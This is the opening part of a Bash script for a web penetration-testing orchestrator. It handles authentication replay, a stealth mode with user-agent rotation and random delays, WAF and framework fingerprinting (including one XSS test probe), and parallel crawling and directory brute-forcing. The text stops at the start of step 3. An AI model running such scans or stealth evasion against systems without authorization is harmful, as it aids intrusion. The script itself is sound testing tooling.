#!/usr/bin/env bash
# ╔════════════════════════════════════════════════════════════════════╗
# ║  TRAKTR v2.0 -- Intelligent Web Pentest Orchestrator             ║
# ║  Usage: traktr <target> [flags]  |  traktr -r request.txt        ║
# ╚════════════════════════════════════════════════════════════════════╝
set -euo pipefail

TRAKTR_VERSION="2.0.0"
TRAKTR_ROOT="${TRAKTR_ROOT:-$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)}"
TRAKTR_HOME="${HOME}/.traktr"
SCAN_START=$(date +%s)

# Ensure Go tools and local bins are in PATH
export PATH="${HOME}/go/bin:/usr/local/go/bin:${HOME}/.local/bin:${PATH}"

# ── Defaults ─────────────────────────────────────────────────────────────────
TARGET="" ; REQUEST_FILE="" ; SCOPE_PATTERN=""
AUTH_BASIC="" ; CUSTOM_COOKIES="" ; CUSTOM_HEADERS=() ; BEARER_TOKEN=""
STEALTH=false ; OSCP=false ; AGGRESSIVE=false ; DEBUG=false ; QUIET=false
JSON_OUT=false ; DRY_RUN=false ; RESUME_FILE=""
LFI_ONLY=false ; PARAM_ONLY=false ; SECRETS_ONLY=false
SKIP_LFI=false ; SKIP_NUCLEI=false
THREADS=20 ; RATE_LIMIT=0 ; CRAWL_DEPTH=5 ; REQ_TIMEOUT=10
OUTDIR="" ; WAF_DETECTED="none" ; FRAMEWORK="generic"
REQUEST_COUNT=0

# ── Source modules ───────────────────────────────────────────────────────────
source "${TRAKTR_ROOT}/src/core/request_parser.sh"
source "${TRAKTR_ROOT}/src/intel/brain.sh"
# Phase 3 modules (sourced when available, graceful skip if still placeholder)
# shellcheck disable=SC1090
for _mod in lfi_engine param_miner secret_scanner rce_engine; do
  [[ -f "${TRAKTR_ROOT}/src/intel/${_mod}.sh" ]] && source "${TRAKTR_ROOT}/src/intel/${_mod}.sh" 2>/dev/null || true
done
# shellcheck disable=SC1090
for _mod in scope_guard helpers reporter; do
  [[ -f "${TRAKTR_ROOT}/src/utils/${_mod}.sh" ]] && source "${TRAKTR_ROOT}/src/utils/${_mod}.sh" 2>/dev/null || true
done
[[ -f "${TRAKTR_ROOT}/src/core/plugin_loader.sh" ]] && source "${TRAKTR_ROOT}/src/core/plugin_loader.sh" 2>/dev/null || true
[[ -f "${TRAKTR_ROOT}/src/utils/spinner.sh" ]] && source "${TRAKTR_ROOT}/src/utils/spinner.sh" 2>/dev/null || true

# ── Minimal helpers (until helpers.sh is built in Phase 3) ───────────────────
_log()  {
  [[ "$QUIET" == true ]] && return
  # Stop spinner temporarily so log output isn't mangled
  local had_spinner=false
  [[ -n "${_SPINNER_PID:-}" ]] && { had_spinner=true; _spinner_stop 2>/dev/null; }
  local ts; ts="[$(date '+%H:%M:%S')]"
  # Terminal: preserve ANSI colors
  printf '%s %s\n' "$ts" "$1" >&2
  # Log file: strip ANSI codes for clean text
  if [[ -n "${LOGFILE:-}" ]] && [[ -f "${LOGFILE:-}" ]]; then
    printf '%s %s\n' "$ts" "$1" | sed 's/\x1b\[[0-9;]*m//g' >> "$LOGFILE"
  fi
  # Restart spinner if it was running
  $had_spinner && [[ -n "${_SPINNER_LAST_MSG:-}" ]] && _spinner_start "$_SPINNER_LAST_MSG" 2>/dev/null || true
}
_ok()   { _log $'  \033[1;32m[+]\033[0m '"$1"; }
_warn() { _log $'  \033[1;33m[!]\033[0m '"$1"; }
_fail() { _log $'  \033[1;31m[-]\033[0m '"$1"; }
_debug(){ [[ "$DEBUG" == true ]] && _log "  [DBG] $1" || true; }
_die()  { _fail "$1"; exit 1; }

# Spinner-aware wrapper
_spin() {
  local msg="$1"
  _SPINNER_LAST_MSG="$msg"
  declare -f _spinner_start &>/dev/null && _spinner_start "$msg" || true
}
_spin_stop() {
  _SPINNER_LAST_MSG=""
  declare -f _spinner_stop &>/dev/null && _spinner_stop || true
}
_spin_update() {
  _SPINNER_LAST_MSG="$1"
  declare -f _spinner_update &>/dev/null && _spinner_update "$1" || true
}
_tool_cmd() {
  declare -f _show_tool_cmd &>/dev/null && _show_tool_cmd "$@" || true
}
_step_bar() {
  declare -f _progress_bar &>/dev/null && _progress_bar "$@" || true
}

# ── Process tree killer (recursive) ──────────────────────────────────────────
_kill_tree() {
  local pid=$1 sig=${2:-TERM}
  local children
  children=$(pgrep -P "$pid" 2>/dev/null) || true
  for child in $children; do
    _kill_tree "$child" "$sig"
  done
  kill "-${sig}" "$pid" 2>/dev/null || true
}

_kill_tree_hard() {
  local pid=$1
  _kill_tree "$pid" TERM
  sleep 0.5
  _kill_tree "$pid" KILL
}

# ── Global cleanup: kill ALL children on exit ────────────────────────────────
_cleanup() {
  local child_pids
  child_pids=$(pgrep -P $$ 2>/dev/null) || true
  for pid in $child_pids; do
    _kill_tree "$pid" TERM
  done
  sleep 0.3
  child_pids=$(pgrep -P $$ 2>/dev/null) || true
  for pid in $child_pids; do
    kill -9 "$pid" 2>/dev/null || true
  done
  wait 2>/dev/null || true
}
trap '_cleanup' EXIT

_log_request() {
  ((REQUEST_COUNT++)) || true
  [[ "$OSCP" == true ]] && echo "$(date '+%Y-%m-%d %H:%M:%S') | $1 | $2" >> "${OUTDIR}/requests.log"
}

_json_event() {
  [[ "$JSON_OUT" == true ]] && echo "{\"type\":\"$1\",\"ts\":$(date +%s),\"data\":$2}" || true
}

_save_state() {
  local step="$1"
  cat > "${OUTDIR}/.traktr_state.json" << STEOF
{"step":"${step}","target":"${TARGET}","outdir":"${OUTDIR}","timestamp":$(date +%s)}
STEOF
  _debug "State saved at step: $step"
}

# ── Curl wrapper with auth replay + stealth + logging ───────────────────────
_curl() {
  local url="$1"; shift
  local args=(-sk --max-time "$REQ_TIMEOUT" --connect-timeout 5)

  # Auth injection
  [[ -n "$AUTH_BASIC" ]] && args+=(-u "$AUTH_BASIC")
  [[ -n "$BEARER_TOKEN" ]] && args+=(-H "Authorization: Bearer $BEARER_TOKEN")
  [[ -n "$CUSTOM_COOKIES" ]] && args+=(-H "Cookie: $CUSTOM_COOKIES")
  for h in "${CUSTOM_HEADERS[@]+"${CUSTOM_HEADERS[@]}"}"; do
    [[ -n "$h" ]] && args+=(-H "$h")
  done

  # Burp request replay: inject all original headers
  if [[ -n "$REQUEST_FILE" ]] && [[ ${#BURP_HEADERS[@]} -gt 0 ]]; then
    for hdr in "${!BURP_HEADERS[@]}"; do
      [[ "$hdr" == "Host" ]] || [[ "$hdr" == "Content-Length" ]] && continue
      args+=(-H "${hdr}: ${BURP_HEADERS[$hdr]}")
    done
  fi

  # Stealth: UA rotation + random delay + referer
  if [[ "$STEALTH" == true ]]; then
    local -a UAS=(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
      "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.2210.144"
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Mobile/15E148"
    )
    args+=(-H "User-Agent: ${UAS[$((RANDOM % ${#UAS[@]}))]}")
    args+=(-H "Referer: ${url%/*}/")
    sleep "0.$((RANDOM % 20))"
  fi

  # Rate limiting
  if [[ "$RATE_LIMIT" -gt 0 ]]; then
    sleep "$(awk "BEGIN{printf \"%.3f\", 1/$RATE_LIMIT}")"
  fi

  _log_request "$url" "curl ${args[*]}"
  curl "${args[@]}" "$@" "$url" < /dev/null 2>/dev/null
}

# ── Banner ──────────────────────────────────────────────────────────────────
_banner() {
  [[ "$QUIET" == true ]] && return
  # Randomly pick a tractor art on each run
  local art_idx=$(( RANDOM % 3 ))
  cat << 'BANNEREOF'

  ___________              __    __
  \__    ___/___________  |  | _/  |________
    |    |  \_  __ \__  \ |  |/ \   __\_  __ \
    |    |   |  | \// __ \|    < |  |  |  | \/
    |____|   |__|  (____  |__|_ \|__|  |__|
                        \/     \/
BANNEREOF

  case $art_idx in
    0)
      cat << 'ART0'
              _______
               |o  |   !
   __          |:`_|---'-.
  |__|_______.-.'_'.-----.|
 (o)(o)------''._.'     (O)
ART0
      ;;
    1)
      cat << 'ART1'
                       ~~
 :::::::::          o  _||
 :::::::::---------[|<[___]
 :::::::::| | | |  (_)    o
ART1
      ;;
    2)
      cat << 'ART2'
       /\  ,-,---,
      //\\\/|\_|\_|  Y
  ,\_//  \\|/`\ |--'-q  _
   \_/    {( () ) {(===t||
            \_/``````\_/  \
ART2
      ;;
  esac

  cat << 'TAGEOF'
       ~ plowing the web ~
    <3 By @mahdiesta     v2.0
TAGEOF
}

# ── Config loader ──────────────────────────────────────────────────────────
_load_config() {
  local conf="${TRAKTR_HOME}/traktr.json"
  [[ ! -f "$conf" ]] && conf="${TRAKTR_ROOT}/config/traktr.json"
  [[ ! -f "$conf" ]] && { _warn "No config found, using defaults"; return; }

  THREADS=$(jq -r '.scan.max_threads // 20' "$conf")
  REQ_TIMEOUT=$(jq -r '.scan.timeout_seconds // 10' "$conf")
  [[ $(jq -r '.scan.stealth_mode // false' "$conf") == "true" ]] && STEALTH=true || true
  [[ $(jq -r '.scan.oscp_mode // false' "$conf") == "true" ]] && OSCP=true || true
  _debug "Config loaded: threads=$THREADS timeout=$REQ_TIMEOUT"
}

# ── Flag parsing ───────────────────────────────────────────────────────────
_parse_flags() {
  while [[ $# -gt 0 ]]; do
    case "$1" in
      -r|--request)    REQUEST_FILE="$2"; shift 2 ;;
      -u|--url)        TARGET="$2"; shift 2 ;;
      --scope)         SCOPE_PATTERN="$2"; shift 2 ;;
      --auth)          AUTH_BASIC="$2"; shift 2 ;;
      --cookie)        CUSTOM_COOKIES="$2"; shift 2 ;;
      --header)        CUSTOM_HEADERS+=("$2"); shift 2 ;;
      --token)         BEARER_TOKEN="$2"; shift 2 ;;
      --stealth)       STEALTH=true; shift ;;
      --oscp)          OSCP=true; shift ;;
      --aggressive)    AGGRESSIVE=true; CRAWL_DEPTH=10; shift ;;
      --lfi-only)      LFI_ONLY=true; shift ;;
      --param-only)    PARAM_ONLY=true; shift ;;
      --secrets-only)  SECRETS_ONLY=true; shift ;;
      --skip-lfi)      SKIP_LFI=true; shift ;;
      --skip-nuclei)   SKIP_NUCLEI=true; shift ;;
      --threads)       THREADS="$2"; shift 2 ;;
      --rate)          RATE_LIMIT="$2"; shift 2 ;;
      --depth)         CRAWL_DEPTH="$2"; shift 2 ;;
      --timeout)       REQ_TIMEOUT="$2"; shift 2 ;;
      --output)        OUTDIR="$2"; shift 2 ;;
      --json)          JSON_OUT=true; shift ;;
      --quiet)         QUIET=true; shift ;;
      --debug)         DEBUG=true; shift ;;
      --resume)        RESUME_FILE="$2"; shift 2 ;;
      --dry-run)       export DRY_RUN=true; shift ;;
      -h|--help)       _usage; exit 0 ;;
      -V|--version)    echo "traktr $TRAKTR_VERSION"; exit 0 ;;
      -*)              _die "Unknown flag: $1 (try --help)" ;;
      *)               [[ -z "$TARGET" ]] && TARGET="$1"; shift ;;
    esac
  done

  # OSCP mode enforcements
  if [[ "$OSCP" == true ]]; then
    [[ "$RATE_LIMIT" -eq 0 ]] && RATE_LIMIT=50
    _log "[*] OSCP MODE: rate=${RATE_LIMIT}/s, no destructive payloads, full request logging"
  fi
  # Stealth enforcements
  if [[ "$STEALTH" == true ]]; then
    [[ "$RATE_LIMIT" -eq 0 ]] && RATE_LIMIT=10
    _log "[*] STEALTH MODE: UA rotation, random delays, rate=${RATE_LIMIT}/s"
  fi
}

_usage() {
  cat << 'USAGE'
Usage: traktr <target> [flags]
       traktr -r request.txt [flags]

TARGET:
  -r, --request FILE|DIR  Import Burp Suite request file(s)
  -u, --url URL           Target URL
  --scope REGEX           Restrict scanning to matching URLs

AUTH:
  --auth USER:PASS        HTTP Basic auth
  --cookie "k=v"          Custom cookie
  --header "K: V"         Custom header (repeatable)
  --token TOKEN           Bearer token

SCAN:
  --stealth               Delays + UA rotation + rate limit
  --oscp                  OSCP-safe mode (no destructive, logs all)
  --aggressive            Max depth + all payloads
  --lfi-only              LFI detection only
  --param-only            Parameter discovery only
  --secrets-only          Secret scanning only
  --skip-lfi              Skip LFI module
  --skip-nuclei           Skip nuclei scanning
  --threads N             Concurrency (default: 20)
  --rate N                Max requests/sec
  --depth N               Crawl depth (default: 5)
  --timeout N             Request timeout sec (default: 10)

OUTPUT:
  --output DIR            Custom output directory
  --json                  NDJSON stream to stdout
  --quiet                 Findings only
  --debug                 Verbose logging
  --resume FILE           Resume from state checkpoint
  --dry-run               Show plan without executing
USAGE
}

# ═══════════════════════════════════════════════════════════════════════════
#  STEP 0: INITIALIZATION
# ═══════════════════════════════════════════════════════════════════════════
step0_init() {
  _log "[*] STEP 0: Initialization"

  # If -r mode, parse request file first
  if [[ -n "$REQUEST_FILE" ]]; then
    if [[ -d "$REQUEST_FILE" ]]; then
      parse_burp_directory "$REQUEST_FILE"
    else
      parse_burp_request "$REQUEST_FILE"
    fi
    [[ -z "$TARGET" ]] && TARGET="$BURP_TARGET"
  fi

  [[ -z "$TARGET" ]] && _die "No target specified. Use: traktr <url> or traktr -r request.txt"

  # Normalize target (ensure scheme) - auto-detect if not specified
  if [[ "$TARGET" != http://* ]] && [[ "$TARGET" != https://* ]]; then
    # Try https first, fall back to http
    if curl -sk --max-time 5 --connect-timeout 3 -o /dev/null -w '%{http_code}' "https://${TARGET}" 2>/dev/null | grep -qP '^[1-5]'; then
      TARGET="https://${TARGET}"
    else
      TARGET="http://${TARGET}"
    fi
  fi
  # Strip trailing slash
  TARGET="${TARGET%/}"

  # Extract domain for output dir naming
  local domain; domain=$(echo "$TARGET" | sed 's|https\?://||; s|/.*||; s|:.*||')

  # Create output directory
  [[ -z "$OUTDIR" ]] && OUTDIR="${TRAKTR_ROOT}/scan_results/${domain}_$(date +%Y%m%d_%H%M%S)"
  mkdir -p "$OUTDIR" "${OUTDIR}/crawl" "${OUTDIR}/responses" "${OUTDIR}/vuln" "${TRAKTR_ROOT}/logs"
  # Pre-create output files to avoid "No such file" errors downstream
  touch "${OUTDIR}/all_endpoints.txt" "${OUTDIR}/all_endpoints_paths.txt" \
        "${OUTDIR}/probed_urls.txt" "${OUTDIR}/active_params.txt" \
        "${OUTDIR}/lfi_candidates.txt" "${OUTDIR}/redirect_candidates.txt" \
        "${OUTDIR}/findings.json" "${OUTDIR}/secrets.json" \
        "${OUTDIR}/poc_commands.txt" "${OUTDIR}/error_pages.txt" \
        "${OUTDIR}/access_control.txt" "${OUTDIR}/redirects.txt"
  LOGFILE="${TRAKTR_ROOT}/logs/traktr_$(date +%Y%m%d_%H%M%S).log"
  touch "$LOGFILE"

  # Resume handling
  if [[ -n "$RESUME_FILE" ]] && [[ -f "$RESUME_FILE" ]]; then
    local resume_step; resume_step=$(jq -r '.step' "$RESUME_FILE" 2>/dev/null)
    local resume_outdir; resume_outdir=$(jq -r '.outdir' "$RESUME_FILE" 2>/dev/null)
    [[ -d "$resume_outdir" ]] && OUTDIR="$resume_outdir"
    _log "[*] Resuming from step: $resume_step (outdir: $OUTDIR)"
  fi

  # Validate target is reachable
  _log "  Validating target: $TARGET"
  local http_code
  http_code=$(_curl "$TARGET" -o /dev/null -w '%{http_code}' 2>/dev/null) || http_code="000"
  [[ "$http_code" == "000" ]] && _die "Target unreachable: $TARGET"
  _ok "Target alive: HTTP $http_code"

  # Init scope guard
  if [[ -n "$SCOPE_PATTERN" ]]; then
    _log "  Scope restricted: $SCOPE_PATTERN"
  else
    SCOPE_PATTERN="$domain"
  fi

  # Trap signals for clean shutdown (EXIT trap handles _cleanup)
  trap '_warn "Interrupted! Saving state..."; _save_state "interrupted"; _cleanup; exit 130' INT TERM

  _save_state "init"
  _json_event "scan_start" "{\"target\":\"$TARGET\",\"threads\":$THREADS}"
  _ok "Output: $OUTDIR"
}

# ═══════════════════════════════════════════════════════════════════════════
#  STEP 1: RECONNAISSANCE
# ═══════════════════════════════════════════════════════════════════════════
step1_recon() {
  _step_bar 1 6 "Reconnaissance"
  _log "[*] STEP 1: Reconnaissance"
  _spin "Fingerprinting target (WAF + framework detection)..."

  # WAF + tech detection in parallel
  _detect_waf &
  local waf_pid=$!
  _detect_tech_stack &
  local tech_pid=$!
  wait "$waf_pid" "$tech_pid" 2>/dev/null || true

  _spin_stop

  # Read back results (subshell vars don't propagate)
  [[ -f "${OUTDIR}/waf_detected.txt" ]] && WAF_DETECTED=$(cat "${OUTDIR}/waf_detected.txt")
  [[ -f "${OUTDIR}/framework.txt" ]] && FRAMEWORK=$(cat "${OUTDIR}/framework.txt")

  _ok "WAF: ${WAF_DETECTED} | Framework: ${FRAMEWORK}"
  _save_state "recon"
}

_detect_waf() {
  _debug "WAF detection starting"
  local result="none"
  local headers
  headers=$(_curl "$TARGET" -D- -o /dev/null 2>/dev/null) || { echo "$result" > "${OUTDIR}/waf_detected.txt"; return; }

  # Passive: header fingerprinting
  if echo "$headers" | grep -qi 'cf-ray\|cf-cache-status\|server:.*cloudflare'; then
    result="cloudflare"
  elif echo "$headers" | grep -qi 'x-akamai\|akamaighost\|x-akamai-transformed'; then
    result="akamai"
  elif echo "$headers" | grep -qi 'x-sucuri-id\|x-sucuri-cache'; then
    result="sucuri"
  elif echo "$headers" | grep -qi 'mod_security\|modsecurity\|NOYB'; then
    result="modsecurity"
  elif echo "$headers" | grep -qi 'x-amzn-requestid\|x-amz-cf-id'; then
    result="aws_waf"
  elif echo "$headers" | grep -qi 'x-cdn:.*Incapsula\|incap_ses\|visid_incap'; then
    result="imperva"
  elif echo "$headers" | grep -qi 'server:.*BigIP\|BIGipServer'; then
    result="f5_bigip"
  fi

  # Active: send suspicious payload, check for block
  local bad_code
  bad_code=$(_curl "${TARGET}/?test=<script>alert(1)</script>" -o /dev/null -w '%{http_code}' 2>/dev/null) || bad_code="000"
  if [[ "$bad_code" == "403" ]] || [[ "$bad_code" == "406" ]] || [[ "$bad_code" == "429" ]]; then
    [[ "$result" == "none" ]] && result="unknown_waf"
    _debug "WAF active probe: blocked (HTTP $bad_code)"
  fi

  echo "$result" > "${OUTDIR}/waf_detected.txt"
}

_detect_tech_stack() {
  _debug "Tech stack detection starting"
  local result="generic"

  # httpx tech detection (if PD httpx is available)
  local httpx_bin="httpx"
  [[ -f "${HOME}/go/bin/httpx" ]] && httpx_bin="${HOME}/go/bin/httpx"
  if command -v "$httpx_bin" &>/dev/null; then
    echo "$TARGET" | "$httpx_bin" -silent -tech-detect -json 2>/dev/null | \
      head -1 > "${OUTDIR}/tech_raw.json" || true
  fi

  # Manual header + body fingerprinting
  local headers body
  headers=$(_curl "$TARGET" -D- -o "${OUTDIR}/responses/index.html" 2>/dev/null) || true
  body=""
  [[ -f "${OUTDIR}/responses/index.html" ]] && body=$(cat "${OUTDIR}/responses/index.html")

  # Framework detection logic
  local powered_by; powered_by=$(echo "$headers" | grep -i 'x-powered-by' | head -1 | cut -d: -f2- | xargs) || true
  local server; server=$(echo "$headers" | grep -i '^server:' | head -1 | cut -d: -f2- | xargs) || true
  local set_cookie; set_cookie=$(echo "$headers" | grep -i 'set-cookie' | head -1) || true

  if [[ "$powered_by" == *PHP* ]]; then
    if echo "$body" | grep -q 'wp-content\|wp-includes\|wp-json'; then result="wordpress"
    elif echo "$set_cookie" | grep -qi 'laravel_session'; then result="laravel"
    else result="php"; fi
  elif [[ "$powered_by" == *Express* ]]; then
    result="express"
  elif [[ "$powered_by" == *ASP.NET* ]]; then
    result="aspnet"
  elif echo "$body" | grep -q 'csrfmiddlewaretoken'; then
    result="django"
  elif echo "$body" | grep -q '__VIEWSTATE\|__EVENTVALIDATION'; then
    result="aspnet"
  elif echo "$set_cookie" | grep -qi 'JSESSIONID'; then
    result="spring"
  elif echo "$set_cookie" | grep -qi '_rails\|_session_id.*='; then
    result="rails"
  elif echo "$body" | grep -q 'next/static\|__NEXT_DATA__'; then
    result="nextjs"
  elif echo "$body" | grep -q 'ng-app\|ng-controller\|angular'; then
    result="angular"
  elif echo "$body" | grep -q '__nuxt\|nuxt'; then
    result="nuxtjs"
  fi

  # Fallback: detect PHP from .php links in body
  if [[ "$result" == "generic" ]]; then
    echo "$body" | grep -qP 'href=["\x27][^"]*\.php|action=["\x27][^"]*\.php|\.php\?' && result="php" || true
  fi

  echo "$result" > "${OUTDIR}/framework.txt"

  # Save combined tech info
  cat > "${OUTDIR}/tech_stack.json" << TECHEOF
{"framework":"${result}","server":"${server}","powered_by":"${powered_by}","target":"${TARGET}"}
TECHEOF
}

# ═══════════════════════════════════════════════════════════════════════════
#  STEP 2: DEEP CRAWL
# ═══════════════════════════════════════════════════════════════════════════
step2_crawl() {
  _step_bar 2 6 "Deep Crawl"
  _log "[*] STEP 2: Deep Crawl (depth: $CRAWL_DEPTH)"

  local pids=()
  local domain; domain=$(echo "$TARGET" | sed 's|https\?://||; s|/.*||; s|:.*||')

  # Build auth flags for external tools
  local katana_hdrs=()
  local ffuf_hdrs=()
  if [[ -n "$REQUEST_FILE" ]] && [[ -n "${BURP_HEADERS[Cookie]:-}" ]]; then
    katana_hdrs+=(-H "Cookie: ${BURP_HEADERS[Cookie]}")
    ffuf_hdrs+=(-H "Cookie: ${BURP_HEADERS[Cookie]}")
  elif [[ -n "$CUSTOM_COOKIES" ]]; then
    katana_hdrs+=(-H "Cookie: $CUSTOM_COOKIES")
    ffuf_hdrs+=(-H "Cookie: $CUSTOM_COOKIES")
  fi
  if [[ -n "$BEARER_TOKEN" ]]; then
    katana_hdrs+=(-H "Authorization: Bearer $BEARER_TOKEN")
    ffuf_hdrs+=(-H "Authorization: Bearer $BEARER_TOKEN")
  elif [[ -n "$AUTH_BASIC" ]]; then
    local b64; b64=$(echo -n "$AUTH_BASIC" | base64)
    katana_hdrs+=(-H "Authorization: Basic $b64")
    ffuf_hdrs+=(-H "Authorization: Basic $b64")
  fi

  # ── Katana (JS-aware crawl) ──
  if command -v katana &>/dev/null; then
    _tool_cmd "katana" "katana -u $TARGET -jc -d $CRAWL_DEPTH -js-crawl -known-files all"
    (
      timeout 180 katana -u "$TARGET" -jc -d "$CRAWL_DEPTH" -js-crawl -known-files all \
        -silent -nc "${katana_hdrs[@]+"${katana_hdrs[@]}"}" \
        > "${OUTDIR}/crawl/katana.txt" 2>/dev/null || true
    ) &
    pids+=($!)

    # Headless katana for SPAs (aggressive mode only, needs chromium)
    if [[ "$AGGRESSIVE" == true ]] && command -v chromium &>/dev/null; then
      (
        katana -u "$TARGET" -headless -d 3 -silent -nc \
          "${katana_hdrs[@]+"${katana_hdrs[@]}"}" \
          > "${OUTDIR}/crawl/katana_headless.txt" 2>/dev/null || true
      ) &
      pids+=($!)
    fi
  fi

  # ── GAU (historical URLs) ── timeout prevents hanging on bare IPs
  if command -v gau &>/dev/null; then
    _tool_cmd "gau" "gau --threads 5 $domain"
    (
      timeout 90 gau --threads 5 "$domain" > "${OUTDIR}/crawl/gau.txt" 2>/dev/null || true
    ) &
    pids+=($!)
  fi

  # ── Waybackurls ──
  if command -v waybackurls &>/dev/null; then
    _tool_cmd "waybackurls" "echo $domain | waybackurls"
    (
      echo "$domain" | timeout 90 waybackurls > "${OUTDIR}/crawl/wayback.txt" 2>/dev/null || true
    ) &
    pids+=($!)
  fi

  # ── robots.txt + sitemap.xml ──
  (
    _curl "${TARGET}/robots.txt" 2>/dev/null | \
      grep -oP '(?<=Disallow:\s|Allow:\s)\S+' | \
      while IFS= read -r path; do echo "${TARGET}${path}"; done \
      > "${OUTDIR}/crawl/robots.txt" 2>/dev/null || true

    _curl "${TARGET}/sitemap.xml" 2>/dev/null | \
      grep -oP 'https?://[^<"'"'"'\s]+' \
      > "${OUTDIR}/crawl/sitemap.txt" 2>/dev/null || true
  ) &
  pids+=($!)

  # ── ffuf directory bruteforce ──
  local wordlist="${TRAKTR_ROOT}/wordlists/dirs_common.txt"
  if command -v ffuf &>/dev/null && [[ -f "$wordlist" ]]; then
    _tool_cmd "ffuf" "ffuf -u ${TARGET}/FUZZ -w dirs_common.txt -mc 200,301,302,403 -ac -t 10"
    local ffuf_rate_flag=()
    [[ "$RATE_LIMIT" -gt 0 ]] && ffuf_rate_flag+=(-rate "$RATE_LIMIT")
    (
      # -ac = auto-calibrate: filters out catch-all responses (try_files fallbacks)
      timeout 180 ffuf -u "${TARGET}/FUZZ" -w "$wordlist" \
        -mc 200,201,301,302,307,401,403,500 -ac \
        -t 10 -s "${ffuf_rate_flag[@]+"${ffuf_rate_flag[@]}"}" \
        "${ffuf_hdrs[@]+"${ffuf_hdrs[@]}"}" 2>/dev/null | \
        while IFS= read -r word; do
          [[ -n "$word" ]] && echo "${TARGET}/${word}"
        done > "${OUTDIR}/crawl/ffuf_dirs.txt" || true
    ) &
    pids+=($!)
  fi

  # ── feroxbuster (recursive directory discovery) ──
  if command -v feroxbuster &>/dev/null && [[ -f "$wordlist" ]]; then
    _tool_cmd "feroxbuster" "feroxbuster -u $TARGET -w dirs_common.txt --depth 2 --auto-tune -q"
    local ferox_rate=()
    [[ "$RATE_LIMIT" -gt 0 ]] && ferox_rate+=(--rate-limit "$RATE_LIMIT")
    (
      timeout 180 feroxbuster -u "$TARGET" -w "$wordlist" \
        --depth 2 --auto-tune -q --no-state -t 10 \
        --status-codes 200,201,301,302,307,401,403 \
        "${ferox_rate[@]+"${ferox_rate[@]}"}" \
        "${ffuf_hdrs[@]+"${ffuf_hdrs[@]}"}" 2>/dev/null | \
        grep -oP 'https?://[^\s]+' > "${OUTDIR}/crawl/feroxbuster.txt" || true
    ) &
    pids+=($!)
  fi

  # Wait for all crawlers with a master deadline (4 minutes max)
  local crawl_deadline=$(( $(date +%s) + 240 ))
  _log "  Waiting for ${#pids[@]} crawlers (max 4 min)..."
  _spin "Running ${#pids[@]} crawlers in parallel (katana, ffuf, gau, wayback)..."
  for pid in "${pids[@]}"; do
    while kill -0 "$pid" 2>/dev/null; do
      if [[ $(date +%s) -ge $crawl_deadline ]]; then
        _debug "Crawl deadline reached, killing remaining crawlers"
        for kpid in "${pids[@]}"; do _kill_tree_hard "$kpid"; done
        break 2
      fi
      sleep 1
    done
    wait "$pid" 2>/dev/null || true
  done
  _spin_stop

  # ── HTML link extraction (lightweight spider from index page) ──
  _debug "Extracting links from HTML pages"
  (
    local base_url="$TARGET"
    # Fetch the main page and extract href/src links
    local body
    body=$(_curl "$TARGET" 2>/dev/null) || true
    if [[ -n "$body" ]]; then
      # Extract href and src attributes
      echo "$body" | grep -oiP '(?:href|src|action)\s*=\s*["\x27]([^"\x27#]+)' | \
        grep -oiP '["\x27][^"\x27]+' | tr -d "\"'" | while IFS= read -r link; do
          [[ -z "$link" ]] && continue
          [[ "$link" == "http"* ]] && { echo "$link"; continue; }
          [[ "$link" == "//"* ]] && continue
          [[ "$link" == "/"* ]] && { echo "${base_url}${link}"; continue; }
          echo "${base_url}/${link}"
        done
      # Follow one level deep -- fetch each discovered page for more links
      echo "$body" | grep -oiP 'href\s*=\s*["\x27](/[^"\x27#?]+\.php)' | \
        grep -oiP '/[^"\x27]+' | sort -u | head -20 | while IFS= read -r page; do
          local page_body
          page_body=$(_curl "${base_url}${page}" 2>/dev/null) || continue
          echo "$page_body" | grep -oiP '(?:href|src|action)\s*=\s*["\x27]([^"\x27#]+)' | \
            grep -oiP '["\x27][^"\x27]+' | tr -d "\"'" | while IFS= read -r link; do
              [[ -z "$link" ]] && continue
              [[ "$link" == "http"* ]] && { echo "$link"; continue; }
              [[ "$link" == "//"* ]] && continue
              [[ "$link" == "/"* ]] && { echo "${base_url}${link}"; continue; }
              echo "${base_url}/${link}"
            done
        done
    fi
  ) > "${OUTDIR}/crawl/html_links.txt" 2>/dev/null || true

  # ── MERGE + DEDUPE + SCOPE FILTER ──
  _log "  Merging crawl results..."
  local _merge_tmp; _merge_tmp=$(mktemp)
  {
    cat "${OUTDIR}"/crawl/*.txt 2>/dev/null
    # Add Burp-imported endpoint if -r mode
    [[ -n "$REQUEST_FILE" ]] && [[ -n "${BURP_TARGET:-}" ]] && echo "$BURP_TARGET"
    # Always include the target itself
    echo "$TARGET"
  } | while IFS= read -r line; do
    [[ -z "$line" ]] && continue
    # Lines that are already full URLs
    if [[ "$line" == http://* ]] || [[ "$line" == https://* ]]; then
      echo "$line"
    # Bare paths starting with / -- prepend target base
    elif [[ "$line" == /* ]]; then
      echo "${TARGET}${line}"
    # Bare words (like ffuf output without our fix, or relative paths)
    elif [[ "$line" != *" "* ]] && [[ ${#line} -lt 200 ]]; then
      echo "${TARGET}/${line}"
    fi
  done > "$_merge_tmp"

  # Dedupe: paths only (strip query/fragment)
  grep -oP 'https?://[^\s<>"'"'"'\\]+' "$_merge_tmp" 2>/dev/null | \
    sed 's/[?#].*//' | sort -u | \
    grep -E "$SCOPE_PATTERN" \
    > "${OUTDIR}/all_endpoints_paths.txt" 2>/dev/null || true

  # Full URLs with query strings (for param mining later)
  grep -oP 'https?://[^\s<>"'"'"'\\]+' "$_merge_tmp" 2>/dev/null | sort -u | \
    grep -E "$SCOPE_PATTERN" \
    > "${OUTDIR}/all_endpoints.txt" 2>/dev/null || true
  rm -f "$_merge_tmp"

  # Per-source metrics
  _log "  Crawl metrics:"
  for f in "${OUTDIR}"/crawl/*.txt; do
    [[ -f "$f" ]] || continue
    local count; count=$(wc -l < "$f" 2>/dev/null || echo 0)
    [[ "$count" -gt 0 ]] && _log "    $(basename "$f"): ${count} URLs"
  done
  local total; total=$(wc -l < "${OUTDIR}/all_endpoints.txt" 2>/dev/null || echo 0)
  _ok "Total unique endpoints: $total"

  _json_event "crawl_complete" "{\"total\":$total}"
  _save_state "crawl"
}

# ═══════════════════════════════════════════════════════════════════════════
#  STEP 3: ENDPOINT PROBING
